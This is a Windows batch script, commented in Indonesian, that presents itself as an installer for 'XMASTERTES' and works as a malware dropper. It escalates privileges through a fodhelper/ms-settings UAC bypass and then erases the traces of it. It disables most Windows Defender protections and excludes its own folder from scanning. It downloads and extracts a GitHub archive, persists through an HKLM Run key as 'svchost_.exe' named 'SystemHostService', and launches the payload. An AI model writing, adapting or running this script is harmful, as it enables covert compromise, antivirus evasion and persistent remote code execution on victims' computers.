@echo off
:: ===============================
:: XMASTERTES Installer Final FIX
:: Bypass .pwn + Elevated Execution
:: ===============================

setlocal enabledelayedexpansion

:: === VARIABEL ===
set "folderPath=C:\ProgramData\AppData"
set "zipName=XMASTERTES.zip"
set "extractFolder=XMASTERTES-main"
set "fullPath=%folderPath%\%extractFolder%"
set "exePath=%fullPath%\svchost_.exe"
set "currentDir=%~dp0"
set "bypassFile=%temp%\UACbypass.ps1"

:: === CEK ADMINISTRATOR ===
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Membutuhkan hak Administrator - mencoba bypass UAC...
    
    :: Buat file PowerShell sementara
    > "%bypassFile%" (
        echo $bat = '%~f0'
        echo $arg = 'elevated'
        echo $cmd = "powershell -WindowStyle Hidden -Command Start-Process `"$bat`" -ArgumentList `"$arg`""
        echo New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force ^| Out-Null
        echo Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $cmd -Force
        echo New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force ^| Out-Null
        echo Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force
        echo Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    )

    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%bypassFile%"
    timeout /t 5 >nul
    exit /b
)

:: === HAPUS JEJAK BYPASS ===
if "%~1"=="elevated" (
    echo [*] Berhasil elevated. Membersihkan jejak...
    reg delete "HKCU\Software\Classes\.pwn" /f >nul 2>&1
    reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
    del /f /q "%bypassFile%" >nul 2>&1
)

echo [*] Script berjalan sebagai Administrator...

:: === DETEKSI WINDOWS ===
ver | findstr /i "10.0." >nul
if %errorlevel%==0 (
    goto Windows10
) else (
    goto Windows11
)

:Windows10
echo [*] Windows 10 terdeteksi

:: Nonaktifkan Proteksi Defender (Win10)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -MAPSReporting 0"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
goto DefenderExclusion

:Windows11
echo [*] Windows 11 terdeteksi

:: Nonaktifkan Proteksi Defender (Win11)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
powershell -Command "Set-MpPreference -MAPSReporting 0"

:DefenderExclusion
echo [*] Menambahkan folder ke pengecualian Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
powershell -Command "Add-MpPreference -ExclusionPath '%fullPath%'"

:: === BUAT FOLDER ===
mkdir "%folderPath%" 2>nul

:: === DOWNLOAD ZIP ===
echo [*] Mengunduh file dari GitHub...
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile '%folderPath%\%zipName%'"

:: === EKSTRAK ZIP ===
echo [*] Mengekstrak file ZIP...
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Expand-Archive -Path '%folderPath%\%zipName%' -DestinationPath '%folderPath%' -Force"

:: === TAMBAHKAN KE STARTUP ===
echo [*] Menambahkan ke startup...
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHostService" /t REG_SZ /d "%exePath%" /f

:: === JALANKAN APLIKASI ===
echo [*] Menjalankan aplikasi...
start "" explorer "%fullPath%"
if exist "%fullPath%\RunScript.bat" (
    start "" "%fullPath%\RunScript.bat"
)

echo [✓] Instalasi selesai.
exit
